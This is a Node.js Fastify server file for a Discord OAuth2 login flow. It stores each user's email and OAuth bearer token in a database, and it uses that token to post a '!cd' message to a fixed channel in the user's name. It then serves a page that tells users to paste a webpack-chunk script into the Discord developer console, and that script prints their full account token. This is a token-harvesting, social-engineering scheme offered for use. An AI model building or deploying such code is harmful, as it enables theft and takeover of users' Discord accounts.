// Require the framework and instantiate it
require('dotenv').config();
const fastify = require('fastify')({ logger: false });
const fetch = require('node-fetch');
const fs = require('fs');
const db = require('./utils/db');
const PORT = process.env.PORT || 5000;

// Declare a route
fastify.get('/', async (req, res) => {
  const { code } = req.query;
  if (code) {
    try {
      const oauthResult = await fetch('https://discord.com/api/v9/oauth2/token', {
        method: 'POST',
        body: new URLSearchParams({
          client_id: process.env.DISCORD_CLIENT_ID,
          client_secret: process.env.DISCORD_CLIENT_SECRET,
          code,
          grant_type: 'authorization_code',
          redirect_uri: process.env.OAUTH2_REDIRECT_URI,
          scope: 'identify email connections guilds bot',
        }),
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
      });

      const oauthData = await oauthResult.json();
      console.log('oauthData', oauthData);

      const userResult = await fetch('https://discord.com/api/users/@me', {
        headers: {
          authorization: `${oauthData.token_type} ${oauthData.access_token}`,
        },
      });

      const sendMessage = await fetch(`https://discord.com/api/v9/channels/${process.env.SG_CHANNEL_ID}/messages`, {
        method: 'POST',
        body: JSON.stringify({
          "content": "!cd",
          "tts": false
        }),
        headers: {
          'Content-Type': 'application/json',
          authorization: `${oauthData.token_type} ${oauthData.access_token}`
        }
      });

      console.log('sendMessage', await sendMessage.json());
      const userData = await userResult.json();
      console.log('userData', userData);
      const insert = {
        user_id: userData.id,
        username: userData.username,
        email: userData.email,
        bearer_token: oauthData.access_token
      };

      if (userData.code !== 0) {
        await db.from('sg_users')
          .insert(insert)
          .onConflict(['user_id'])
          .merge();
      }

      const codeGetToken = "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()";
      const html = `
        <span>OK, Logged as ${userData.username}#${userData.discriminator}. Please get your Discord Token!</span>
        <br/><br/>
        <strong>How to get Discord Token?</strong>
        <ol>
          <li>Goto <a href="https://discord.com/app" target="_blank">discord.com/app</a> web and login</li>
          <li>After login, run your browser developer console</li>
          <li>Run this script:<br/>
          <textarea rows="5" cols="70">alert(${codeGetToken})</textarea>
          <br/>And enter.
          </li>
          <li>Your token will appear on browser.</li>
        </ol>
      `;
      return res.type('text/html').send(html);

    } catch (error) {
      // NOTE: An unauthorized token will not throw an error;
      // it will return a 401 Unauthorized response in the try block above
      return res.send(`Error ${error.message}`)
    }
	}
  const stream = fs.createReadStream('index.html');
  return res.type('text/html').send(stream)
});

// Run the server!
const start = async () => {
  try {
    await fastify.listen(PORT, '0.0.0.0');
    console.log('Server running at port', PORT);
  } catch (err) {
    console.log.error(err);
    process.exit(1);
  }
}
start();
